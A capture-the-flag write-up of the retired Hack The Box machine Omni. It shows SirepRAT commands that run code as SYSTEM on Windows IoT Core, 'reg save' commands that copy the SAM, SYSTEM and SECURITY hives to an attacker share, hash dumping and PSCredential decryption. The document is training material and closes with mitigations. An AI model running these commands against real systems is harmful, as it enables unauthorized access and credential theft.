---
machine: Omni
os: Windows
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [windows, windows-iot, sirep, sireprat, registry-hives, pscredential, clixml, wdp]
---

# Omni — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The host is Windows IoT Core. The exposed Sirep service allows command execution as SYSTEM with SirepRAT. From there, encrypted `PSCredential` files are read and the SAM/SYSTEM/SECURITY hives are dumped. The `app` hash is cracked, the Windows Device Portal is accessed and the user credential is decrypted; an administration XML reveals the `administrator` password, which yields the root flag.

## Reconnaissance

```bash
nmap -Pn -p- --min-rate 10000 <IP>
nmap -Pn -sC -sV -p135,5985,8080,29817,29819,29820 <IP>
```

- 135 RPC, 5985 WinRM, 8080 Windows Device Portal.
- 29817, 29819 and 29820 are the Windows IoT Core Sirep service.
- The portal requests basic authentication and identifies as `Windows Device Portal`.

## Enumeration

The Sirep service requires no authentication and accepts system commands. Clone SirepRAT and confirm execution:

```bash
python3 SirepRAT.py <IP> LaunchCommandWithOutput --return_output \
  --cmd "C:\Windows\System32\cmd.exe" --args ' /c whoami'
```

The response is `nt authority\system`. The host does not have `whoami.exe` in PATH, but the full path works.

## Foothold

With SYSTEM, read the credential files in the user profiles:

```bash
python3 SirepRAT.py <IP> LaunchCommandWithOutput --return_output \
  --cmd "C:\Windows\System32\cmd.exe" --args ' /c type C:\Data\Users\app\user.txt'
```

`user.txt` is a `PSCredential` serialized with `Export-Clixml`; the password is DPAPI-encrypted and tied to the user. The registry can also be dumped:

```bash
reg save HKLM\sam \\<LHOST>\share\sam
reg save HKLM\system \\<LHOST>\share\system
reg save HKLM\security \\<LHOST>\share\security
```

```bash
secretsdump.py -sam sam -security security -system system LOCAL
```

The `app` hash is cracked offline with hashcat. The resulting `<APP_PASSWORD>` opens the Windows Device Portal on 8080.

## Lateral movement

The portal's process section can run commands. Launch a reverse shell as `app` and decrypt the credential:

```powershell
(Import-CliXml -Path C:\Data\Users\app\user.txt).GetNetworkCredential().Password
```

The same profile contains `iot-admin.xml`, a credential for `administrator`; `app` can decrypt it:

```powershell
$cred = Import-CliXml -Path C:\Data\Users\app\iot-admin.xml
$cred.GetNetworkCredential() | fl
```

## Privilege escalation

Use `<ADMIN_PASSWORD>` to sign in to the Windows Device Portal as `administrator`. Launch another reverse shell and decrypt `root.txt` with `Import-CliXml`.

```powershell
(Import-CliXml -Path C:\Data\Users\administrator\root.txt).GetNetworkCredential().Password
```

The account is a local administrator; the flag is redacted.

## Evidence

- `whoami` as SYSTEM through Sirep.
- Names of the `PSCredential` files, without contents.
- `secretsdump` with redacted hashes.
- `Import-CliXml` and `whoami` as administrator.

## Lessons learned

- Windows IoT Core may expose Sirep without authentication.
- `Export-Clixml` protects with DPAPI, not an independent key: the user can decrypt it.
- An administration file in a user profile may contain higher-privilege credentials.

## Mitigations and detection

- Filter Sirep ports and do not expose Windows Device Portal to the network.
- Change default credentials and do not store administrator `PSCredential` files in user profiles.
- Restrict `reg save` and access to SAM/SYSTEM/SECURITY.
- Alert on remote Sirep execution, registry dumps and anomalous portal access.

## References

- <https://www.hackthebox.com/machines/Omni>
- <https://github.com/SafeBreach-Labs/SirepRAT>
- <https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml>
- <https://attack.mitre.org/techniques/T1003/002/>
